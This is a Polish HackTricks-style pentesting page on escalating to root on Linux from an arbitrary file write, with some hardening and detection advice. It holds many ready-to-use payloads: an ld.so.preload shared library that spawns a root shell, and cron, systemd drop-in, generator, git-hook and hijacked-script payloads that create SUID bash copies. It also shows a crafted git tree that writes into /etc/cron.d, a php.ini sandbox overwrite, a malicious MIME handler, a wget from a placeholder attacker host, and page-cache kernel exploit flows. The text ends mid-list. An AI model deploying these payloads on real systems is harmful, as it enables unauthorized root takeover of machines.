# Dowolny zapis pliku jako root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` to systemowa lista obiektów współdzielonych, które dynamiczny linker ładuje przed innymi obiektami współdzielonymi. Tryb bezpiecznego wykonywania wprowadza dodatkowe ograniczenia dotyczące preloadingu, dlatego ścieżka do biblioteki, taka jak `/tmp/pe.so`, nie jest uniwersalną techniką wykorzystującą pliki binarne SUID.\
Jeśli możesz utworzyć ten plik lub go zmodyfikować, proces, który go wczyta, załaduje wymienioną bibliotekę przed pozostałymi obiektami współdzielonymi, umożliwiając wykonanie kodu w kontekście tego procesu.<sup>[[12]](#references)</sup>

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** to wykonywalne skrypty uruchamiane w odpowiedzi na zdarzenia w repozytorium, w tym operacje commit i merge. Jeśli **uprzywilejowany skrypt lub użytkownik** wykonuje te operacje, a atakujący może **zapisywać w folderze `.git`**, hook może posłużyć do **privilege escalation**.<sup>[[13]](#references)</sup>

Na przykład można **wygenerować skrypt** w repozytorium git, w **`.git/hooks`**, aby był zawsze uruchamiany przy tworzeniu nowego commita:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal w eksporcie uprzywilejowanego drzewa Git

Uprzywilejowany synchronizator może pominąć checkout i zamiast tego wyliczyć pliki w repozytorium, na które ma wpływ atakujący, za pomocą `git ls-tree`, odczytać każdy blob poleceniem `git cat-file`, połączyć zgłoszoną ścieżkę z katalogiem stagingowym i samodzielnie zapisać plik. W połączeniu `-c safe.directory=*` (wyłączającego ochronę Git przed repozytorium należącym do innego użytkownika) z brakiem kontroli, czy ścieżka docelowa pozostaje w katalogu, prowadzi to do **dowolnego zapisu pliku z uprawnieniami synchronizatora**. Bezwzględna nazwa wpisu drzewa sprawia, że Pythonowe `os.path.join(stage, name)` pomija `stage`; ścieżka względna zawierająca `../` prowadzi poza katalog, gdy system plików ją rozwiąże. Ponieważ aplikacja materializuje surowe drzewo zamiast zlecić Gitowi jego checkout, odrzucanie ścieżek podczas checkoutu nie chroni miejsca zapisu.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Szukaj takiego wzorca kodu w usługach działających jako root, timerach, agentach wdrożeniowych, importerach szablonów oraz zadaniach tworzenia kopii zapasowych i przywracania danych:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Wpis drzewa jest zakodowany jako `<mode> SP <name> NUL <raw object ID>`. Opcja `git hash-object --literally` celowo dopuszcza dane obiektu, które mogą zostać odrzucone przez zwykłe parsowanie lub `git fsck`, dlatego tymczasowy klon może utworzyć drzewo, którego nazwa pliku jest bezwzględną ścieżką docelową. Ten przykład tworzy blob pliku cron, opakowuje spreparowane drzewo w commit i przesuwa do niego gałąź; wykorzystanie nadal wymaga uprawnień do aktualizacji repozytorium używanego przez zadanie z uprawnieniami oraz serwera Git, który akceptuje nieprawidłowy obiekt.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening musi obejmować zarówno pobieranie repozytorium, jak i końcową operację na systemie plików:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zastąp `safe.directory=*` dokładnymi repozytoriami, którym usługa musi ufać, i tam, gdzie to możliwe, przetwarzaj repozytoria bez uprawnień root.
- Odrzucaj nazwy bezwzględne oraz wszystkie komponenty `.` i `..` przed materializacją. Po połączeniu ścieżek kanonizuj je i sprawdzaj, czy lokalizacja docelowa pozostaje w obrębie zamierzonego katalogu głównego.
- Unikaj wyścigów symlinków typu check-then-open: otwieraj ścieżki względem zaufanego deskryptora katalogu, a w systemie Linux używaj `openat2()` z `RESOLVE_BENEATH` oraz `RESOLVE_NO_SYMLINKS` dla ścieżek kontrolowanych przez atakującego.
- Zamiast odtwarzać checkout na podstawie wyjścia plumbing, preferuj zwykły checkout w odizolowanym katalogu. Jeśli pobieranie surowych obiektów jest konieczne, włącz walidację po stronie odbiorczej, taką jak `receive.fsckObjects=true`; nie obniżaj poziomu kontroli znalezisk `receive.fsck.*` dotyczących nazw ścieżek, które są potrzebne do odrzucania spreparowanych drzew.

### Wdrażanie uprzywilejowanej konfiguracji

Niektóre usługi zarządzające przechowują zamierzony stan systemu w pliku konfiguracyjnym, a następnie wdrażają go z podwyższonymi uprawnieniami. Na przykład [openmediavault przechowuje konfigurację w `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), a jego [interfejs RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) może wprowadzać zmiany w usługach. Jeśli konto z niższymi uprawnieniami może zapisywać lub podmieniać ten plik, sprawdź, czy może też zażądać autoryzowanego wdrożenia i czy wybrany moduł przetwarza zmienione pole jako root. Klucze kont SSH, zaplanowane polecenia i instalowanie pakietów wymagają różnych warunków wstępnych; sama obecność pliku lub możliwość zapisu pliku XML nie dowodzi, że którykolwiek z tych scenariuszy jest możliwy. Sprawdź uprawnienia do pliku i katalogu nadrzędnego, grupy wywołującego i jego autoryzację RPC, zainstalowaną wersję oraz faktyczny komponent przetwarzający, nie edytując konfiguracji ani nie wywołując operacji apply podczas enumeracji.

Definicje akcji Fail2Ban w `/etc/fail2ban/action.d/` to kolejna granica uprzywilejowanej konfiguracji. Użytkownik, który może zapisywać w tym katalogu i go przeszukiwać, może być w stanie podmienić definicję akcji lub dodać jej nadpisanie, ale same uprawnienia do katalogu nie dowodzą możliwości wykonania kodu. Potwierdź, że włączony jail faktycznie wybiera zmienioną akcję, że usługa Fail2Ban wykonuje ją z wyższymi uprawnieniami oraz że nastąpi autoryzowane przeładowanie lub ponowne uruchomienie, po którym wystąpi zdarzenie ban pasujące do reguły. Niezwiązane uprawnienie sudo do ponownego uruchomienia Fail2Ban ma znaczenie tylko wtedy, gdy dotyczy dokładnego wywołania usługi, a zmieniona definicja zostanie załadowana. [Dokumentacja konfiguracji akcji Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) opisuje zależność między katalogiem akcji a jail; [przykładowa akcja](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) pokazuje, że `actionban` jest wykonywane przy banie z uprawnieniami użytkownika usługi. Podczas enumeracji sprawdzaj uprawnienia i efektywną konfigurację, nie zmieniając akcji ani nie wywołując banów.

Odrębna granica bezpieczeństwa występuje, gdy włączony jail Fail2Ban używa akcji pocztowej wzbogaconej o WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) dotyczyło niezaufanego tekstu WHOIS przekazywanego potokiem do GNU mailutils `mail`, którego obsługa sekwencji escape mogła uruchomić polecenie. Użytkownik z niższymi uprawnieniami, który może zapisywać pliki, może wpłynąć na odpowiedź, jeśli może zmienić konfigurację nadpisania serwera **wybranego klienta WHOIS**; [plik `whois.conf(5)` Debiana](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) opisuje jeden z takich plików, ale jego ścieżka i użycie zależą od instalacji. Sprawdź efektywną konfigurację jail/akcji, tożsamość usługi, faktycznego klienta WHOIS i ścieżkę jego konfiguracji, implementację mail, możliwość kontrolowania odpowiedzi oraz poprawkę dostawcy lub backport zainstalowanej wersji. Sam zapisywalny plik konfiguracji WHOIS, wersja Fail2Ban lub akcja pocztowa nie dowodzą istnienia całego łańcucha; podczas pasywnej enumeracji nie odpytuj zewnętrznego serwera ani nie wywołuj banów.

### Tworzenie plików przez TFTP i uprzywilejowane hooki pakietów

Dostępna usługa TFTP może przekroczyć granicę kontenera lub lokalnego użytkownika, gdy jej **efektywne** ustawienia tftpd-hpa powodują uruchomienie jako root, udostępnienie katalogu głównego systemu plików jako katalogu `--secure` i włączenie `--create`. [Podręcznik tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) opisuje opcje tworzenia plików i użytkownika. Może to umożliwić utworzenie nowego pliku w uprzywilejowanym katalogu konfiguracyjnym, w tym w `/etc/apt/apt.conf.d/`; istniejący plik może jednak nadal być chroniony przed podmianą. [Podręcznik konfiguracji APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) opisuje polecenia `APT::Update::Pre-Invoke`. Polecenie `apt update` uruchomione jako root może stać się komponentem wykonującym operację z wyższymi uprawnieniami **tylko wtedy, gdy** odczyta nowy plik konfiguracyjny. Potwierdź rzeczywiste argumenty i tożsamość uruchomionego demona, dostępność sieciową i filtrowanie ruchu, zasady tworzenia plików w katalogu docelowym, efektywny zakres konfiguracji APT oraz późniejsze uprzywilejowane wywołanie. Domyślny plik, zapisywalny katalog docelowy lub zaplanowane polecenie APT nie dowodzą same w sobie istnienia całej ścieżki. Pasywna analiza powinna ograniczać się do odczytu lokalnej konfiguracji i metadanych, bez przesyłania pliku ani uruchamiania APT.

### Pliki Cron i czasu

Jeśli możesz **zapisywać pliki związane z cronem, które są wykonywane przez root**, zwykle możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Warto sprawdzić między innymi:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab użytkownika root w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` i uruchamiane przez nie usługi

Szybkie kontrole:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typowe ścieżki nadużyć:

- **Dodanie nowego zadania cron uruchamianego jako root** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąpienie skryptu** uruchamianego już przez `run-parts`
- **Umieszczenie backdoora w istniejącym celu timera** przez modyfikację uruchamianego przez niego skryptu lub pliku binarnego

Minimalny przykład payloadu cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Jeśli możesz zapisywać tylko w katalogu cron używanym przez `run-parts`, umieść tam plik wykonywalny:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Uwagi:

- `run-parts` zwykle pomija nazwy plików zawierające kropki, dlatego lepiej używać nazw takich jak `backup` zamiast `backup.sh`.<sup>[[15]](#references)</sup>
- Niektóre systemy używają timerów `systemd` zamiast klasycznego cron, ale pomysł nadużycia jest taki sam: **zmodyfikuj to, co root uruchomi później**.<sup>[[20]](#references)</sup>

### Pliki Service i Socket

Jeśli możesz zapisywać **pliki jednostek `systemd`** lub pliki, do których się odwołują, możesz uzyskać wykonanie kodu jako root przez ponowne załadowanie i ponowne uruchomienie jednostki albo czekając, aż zadziała ścieżka aktywacji usługi/socketu.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Sprawdź również dostęp do zapisu i przeszukiwania samego katalogu jednostek systemowych, w tym ACL: użytkownik może utworzyć nową jednostkę w `/etc/systemd/system`, nawet jeśli odczyt zawartości katalogu lub wyświetlanie jego listy jest zabronione. Sama ta ścieżka nie uruchamia niczego. Potwierdź, że menedżer systemu załaduje nową jednostkę, że wywołujący ma efektywne uprawnienie `systemctl start` lub `restart` z możliwością działania jako root dla jej nazwy (albo inną uprzywilejowaną ścieżkę aktywacji) oraz że usługa działa jako zamierzona tożsamość. Zmiana istniejącej, załadowanej jednostki na dysku może wymagać `daemon-reload`; zachowanie podczas ładowania nowej jednostki o innej nazwie jest inne. Przed uznaniem reguły ponownego uruchamiania z symbolem wieloznacznym za wystarczającą sprawdź dokładne argumenty i wykluczenia sudo. Zobacz [ścieżkę wyszukiwania jednostek systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) oraz [zasady ładowania i ponownego ładowania systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania typu drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binaria usług wskazane przez `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=` wczytywane przez usługę działającą jako root

Szybkie kontrole:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Typowe ścieżki nadużyć:

- **Nadpisanie `ExecStart=`** w jednostce usługi należącej do roota, którą możesz modyfikować
- **Dodanie nadpisania typu drop-in** ze złośliwym `ExecStart=` i wcześniejsze wyczyszczenie starego wpisu
- **Umieszczenie backdoora w skrypcie/pliku binarnym** już wskazanym przez jednostkę
- **Przejęcie usługi aktywowanej przez socket** przez modyfikację odpowiadającego jej pliku `.service`, który uruchamia się po odebraniu połączenia przez socket

Przykład złośliwego nadpisania:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typowy przebieg aktywacji:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Jeśli nie możesz samodzielnie zrestartować usług, ale możesz edytować jednostkę aktywowaną przez socket, być może wystarczy **poczekać na połączenie klienta**, aby uruchomić usługę z backdoorem jako root.<sup>[[17]](#references)</sup>

### Katalogi generatorów systemd

**Generatory systemowe** to pliki wykonywalne uruchamiane przez menedżera systemu przed załadowaniem plików jednostek, zarówno podczas rozruchu, jak i ponownego wczytywania konfiguracji. Dlatego możliwość zapisu do katalogu generatorów systemowych (lub do istniejącego generatora będącego plikiem wykonywalnym) stanowi bezpośrednią metodę wykonania kodu jako root, którą łatwo przeoczyć podczas audytu sprawdzającego tylko pliki `*.service` i `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Typowa kolejność wyszukiwania to `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` i `/usr/lib/systemd/system-generators/` (w niektórych dystrybucjach `/lib/systemd/system-generators/` wskazuje na katalog w ramach połączonej hierarchii `/usr`). Plik wykonywalny o tej samej nazwie w katalogu wcześniejszym na liście przesłania plik z późniejszego katalogu. Nie należy mylić tych **katalogów wejściowych plików wykonywalnych** z `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, które zawierają przejściowe pliki jednostek wygenerowane przez generatory.<sup>[[35]](#references)</sup>

Szybkie sprawdzenia:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Nowo utworzony generator musi mieć ustawiony bit wykonywania. Jeśli prymityw zapisu umożliwia kontrolowanie bajtów, ale nie uprawnień, wybierz już wykonywalny generator; nadpisanie go w miejscu zwykle zachowuje jego metadane. Jeśli katalog jest zapisywalny, utwórz nowy wpis i oznacz go jako wykonywalny.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Uruchomienie `systemctl daemon-reload` dla **systemowego** menedżera wymaga odpowiedniej autoryzacji, ale powoduje ponowne uruchomienie wszystkich generatorów systemowych; w przeciwnym razie poczekaj na przeładowanie z uprawnieniami, operację na pakietach lub ponowne uruchomienie systemu. Katalogi generatorów użytkownika, takie jak `~/.config/systemd/user-generators/`, są uruchamiane przez menedżera użytkownika i **same z siebie nie zapewniają uprawnień roota**.<sup>[[35]](#references)</sup>

Na potrzeby hardeningu i wykrywania zagrożeń sprawdzaj wszystkie elementy ścieżki i ACL, a nie tylko końcowe bity uprawnień, zapisuj wartości bazowe hashy i informacje o właścicielu pakietu dla generatorów oraz generuj alerty o utworzeniu, zmianie nazwy, zawartości lub uprawnień w każdym systemowym katalogu wejściowym generatorów. Monitorowanie zapisu jest ważne, ponieważ generator jednorazowego użytku może usunąć się po wykonaniu, a drzewo wygenerowanych jednostek w `/run/systemd/generator*` jest odtwarzane przy następnym przeładowaniu.<sup>[[35]](#references)[[36]](#references)</sup>

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowaną piaskownicę PHP

Niektóre niestandardowe demony weryfikują PHP dostarczone przez użytkownika, uruchamiając `php` z **restrykcyjnym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchamiany w piaskownicy nadal ma **dowolną możliwość zapisu** (np. `file_put_contents`) i możesz uzyskać dostęp do **dokładnej ścieżki `php.ini`** używanej przez demona, możesz **nadpisać tę konfigurację**, usunąć ograniczenia, a następnie przesłać drugi payload uruchamiany z podwyższonymi uprawnieniami.<sup>[[2]](#references)</sup>

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację piaskownicy.
2. Drugi payload wykonuje kod, gdy niebezpieczne funkcje są już ponownie włączone.

Minimalny przykład (zastąp ścieżkę używaną przez demona):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Jeśli daemon działa jako root (lub weryfikuje ścieżki należące do roota), drugie wykonanie zapewnia kontekst roota. To zasadniczo **privilege escalation via config overwrite**, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

`binfmt_misc` udostępnia rejestracje w `/proc/sys/fs/binfmt_misc`; każda rejestracja przypisuje wzorzec typu pliku do interpretera. Wpływ na uprawnienia zależy od tego, kto może zmieniać rejestrację i który proces później wykonuje pasujący plik, dlatego przed uznaniem tego za ścieżkę privilege escalation należy sprawdzić te wymagania.<sup>[[21]](#references)</sup>

Wykonywalny helper z `CAP_DAC_OVERRIDE` może stanowić odrębną ścieżkę rejestracji, jeśli akceptuje dane kontrolowane przez wywołującego i zapisuje je do `/proc/sys/fs/binfmt_misc/register`, nawet gdy wywołujący nie może bezpośrednio zapisywać do tego węzła. Podczas inwentaryzacji sprawdź dane wejściowe helpera i sposób zapisu, nie uruchamiając go. Jeśli zarejestrowana reguła używa flagi `C`, interpreter otrzymuje poświadczenia na podstawie dopasowanego pliku binarnego; dopasowanie SUID należące do roota może więc uruchomić interpreter kontrolowany przez wywołującego jako root. Potwierdź montowanie `binfmt_misc` i zasady rejestracji, efektywną capability helpera, dokładną regułę i ścieżkę interpretera, docelowy plik SUID z ustawionym bitem wykonywalności oraz to, czy `no_new_privs` lub montowanie `nosuid` blokuje przejście SUID. Sam bit capability lub osadzony ciąg ścieżki to jedynie wskazówka do dalszej analizy.<sup>[[21]](#references)</sup> Zobacz [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html), aby poznać warunki blokowania SUID.

### Zastępowanie obsługi schematów (takich jak http: lub https:)

Środowiska graficzne korzystają z powiązań MIME i wpisów desktop, aby wybrać aplikację obsługującą schemat URI; atakujący, który może zapisywać odpowiednie katalogi konfiguracji użytkownika i wpisów desktop, może przekierować te schematy do kontrolowanego przez siebie launchera. Zmiana pliku `$HOME/.config/mimeapps.list`, tak aby obsługę adresów URL HTTP i HTTPS przypisać złośliwemu plikowi (na przykład `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), może sprawić, że kliknięcie użytkownika uruchomi ten wpis desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Skrypty/pliki binarne zapisywalne przez użytkownika uruchamiane jako root

Jeśli uprzywilejowany proces uruchamia coś takiego jak `/bin/sh /home/username/.../script` (lub dowolny plik binarny znajdujący się w katalogu należącym do nieuprzywilejowanego użytkownika), możesz przejąć nad tym kontrolę:<sup>[[1]](#references)</sup>

- **Wykryj uruchomienie:** monitoruj procesy za pomocą pspy, aby wychwycić, gdy root wywołuje ścieżki kontrolowane przez użytkownika.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Potwierdź możliwość zapisu:** upewnij się, że plik docelowy i jego katalog należą do Twojego użytkownika i możesz w nich zapisywać.
- **Przejmij plik docelowy:** utwórz kopię zapasową oryginalnego pliku binarnego/skryptu i umieść payload, który tworzy powłokę SUID (lub wykonuje inne działanie jako root), a następnie przywróć uprawnienia:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Wywołaj uprzywilejowaną akcję** (np. naciśnij przycisk UI, który uruchamia helpera). Gdy root ponownie uruchomi przejętą ścieżkę, przejmij eskalowaną powłokę za pomocą `./rootshell -p`.

### Modyfikowanie plików binarnych uprzywilejowanych tylko w pamięci podręcznej stron

Niektóre błędy jądra nie modyfikują pliku **na dysku**. Zamiast tego pozwalają modyfikować wyłącznie **kopię w pamięci podręcznej stron** czytelnego pliku. Jeśli celem jest plik binarny z ustawionym **setuid** lub w inny sposób uruchamiany jako **root**, przy następnym uruchomieniu mogą zostać wykonane kontrolowane przez atakującego bajty z pamięci, co pozwoli eskalować uprawnienia, mimo że hash pliku na dysku pozostanie bez zmian.<sup>[[3]](#references)[[4]](#references)</sup>

Warto myśleć o tym jak o **prymitywie zapisu do pliku działającym tylko w czasie wykonywania**:<sup>[[3]](#references)</sup>

- **Dysk pozostaje czysty**: inode i bajty zapisane na dysku nie ulegają zmianie
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub uruchamiające plik z buforowanej strony otrzymują treść zmodyfikowaną przez atakującego
- **Efekt jest tymczasowy**: zmiana znika po ponownym uruchomieniu lub usunięciu strony z pamięci podręcznej

Ten prymityw znajduje się pomiędzy klasycznym **dowolnym zapisem do pliku** a starszymi błędami **nadużywającymi pamięci podręcznej stron**, takimi jak Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW opierał się na wyścigu
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- Prymityw oparty wyłącznie na pamięci podręcznej stron może być bardziej niezawodny, jeśli podatna ścieżka umożliwia bezpośredni zapis do buforowanych stron pliku

#### Ogólny przebieg privesc

1. Uzyskaj prymityw jądra umożliwiający zapis do **stron pamięci podręcznej powiązanych z plikiem**
2. Wykorzystaj go przeciwko **czytelnemu plikowi binarnemu z uprzywilejowanymi uprawnieniami** lub innemu plikowi uruchamianemu przez root
3. Uruchom plik, **zanim** strona zostanie usunięta z pamięci podręcznej
4. Uzyskaj wykonanie kodu jako root, mimo że plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o dużej wartości:

- Pliki binarne **setuid-root**
- Helpery uruchamiane przez **usługi root**
- Pliki binarne często uruchamiane z **kontenerów współdzielących jądro / pamięć podręczną stron hosta**

#### Przykładowa ścieżka AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) to dobry przykład tej klasy błędów. Podatna ścieżka znajdowała się w linuksowym API kryptograficznym dla przestrzeni użytkownika (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` może przenosić referencje do stron z pamięci podręcznej stron czytelnego pliku do listy scatterlist TX kryptografii
- ścieżka deszyfrowania `algif_aead` w miejscu ponownie wykorzystywała bufory źródłowe i docelowe
- następnie `authencesn` zapisywał dane w obszarze tagu docelowego
- gdy ten obszar nadal wskazywał na strony pliku umieszczone tam przez `splice()`, zapis trafiał do **pamięci podręcznej stron pliku docelowego**

Interesującą techniką nie jest więc samo CVE, lecz następujący wzorzec:

- **przekaż strony pamięci podręcznej powiązane z plikiem do podsystemu jądra**
- spraw, by podsystem **potraktował je jako bufor wyjściowy do zapisu**
- wywołaj niewielkie, kontrolowane nadpisanie w pamięci

Publiczny PoC używał wielokrotnych **zapisów 4-bajtowych**, aby zmodyfikować `/usr/bin/su` w pamięci, a następnie go uruchomić.<sup>[[4]](#references)[[7]](#references)</sup>

#### Przykładowa ścieżka klonowania ESP / XFRM + netfilter TEE

DirtyClone (CVE-2026-43503) pokazuje inny wariant tego samego wzorca **zapisu do root tylko w pamięci podręcznej stron**, tym razem z deszyfrowaniem IPsec ESP jako **miejscem docelowym**, zamiast `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Kluczową techniką jest **pranie metadanych**:

- `splice()` umieszcza **stronę pamięci podręcznej stron pliku tylko do odczytu** w pakiecie ESP-in-UDP
- pierwotna mitigacja DirtyFrag oznaczała ten skb flagą `SKBFL_SHARED_FRAG`, aby `esp_input()` **najpierw kopiowało dane przed deszyfrowaniem**
- netfilter `TEE` duplikuje pakiet przez `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zachowuje **referencję do tej samej fizycznej strony pamięci podręcznej stron**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` uznaje więc klon za bezpieczny i wykonuje deszyfrowanie **in-place `cbc(aes)`** na stronie powiązanej z plikiem

Wniosek dla osób analizujących kod jest szerszy niż samo CVE: jeśli mitigacja opiera się na **metadanych skb/strony**, aby zdecydować, czy najpierw trzeba skopiować dane, to każda **ścieżka klonowania/kopiowania, która zachowuje stronę bazową, ale odrzuca metadane**, może po cichu ponownie otworzyć prymityw zapisu.

Typowy przebieg exploita:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, aby uzyskać **`CAP_NET_ADMIN` w prywatnej przestrzeni nazw sieci**
2. podnieś interfejs loopback i zainstaluj regułę **netfilter `TEE`** w `mangle/OUTPUT`
3. zainstaluj transportowe SA XFRM ESP za pomocą `NETLINK_XFRM`
4. zakoduj każde docelowe słowo 4-bajtowe w polu `seq_hi` SA (sztuczka DirtyFrag służąca do wyboru słowa)
5. wyślij pakiet ESP-in-UDP umieszczony przez `splice()`, aby **klon TEE** trafił do `esp_input()` i został odszyfrowany **in-place**
6. powtarzaj, aż kopia `/usr/bin/su` w pamięci podręcznej stron lub innego uprzywilejowanego pliku wykonywalnego będzie zawierać kod kontrolowany przez atakującego

Z punktu widzenia działania wpływ jest taki sam jak w przykładzie `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` wykorzystuje **zmodyfikowane bajty z pamięci podręcznej stron** i zapewnia uprawnienia root.<sup>[[8]](#references)[[9]](#references)</sup>

Przydatne kontrole ekspozycji dla tego wariantu:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Krótkoterminowe ograniczenie powierzchni ataku jest tu również zależne od ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę `clone`, a zablokowanie autoloadingu `xt_TEE` usuwa **krok polegający na launderingu flag**, zaś zablokowanie `esp4` / `esp6` usuwa **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Ekspozycja i threat hunting

Jeśli podejrzewasz tę klasę błędów, nie polegaj wyłącznie na kontrolach integralności dysku. Sprawdź również:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Wartości konfiguracji poniżej rozróżniają interfejs ładowany jako moduł od interfejsu wbudowanego w kernel; reguły kompilacji crypto mapują `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` można ładować i usuwać jako moduł
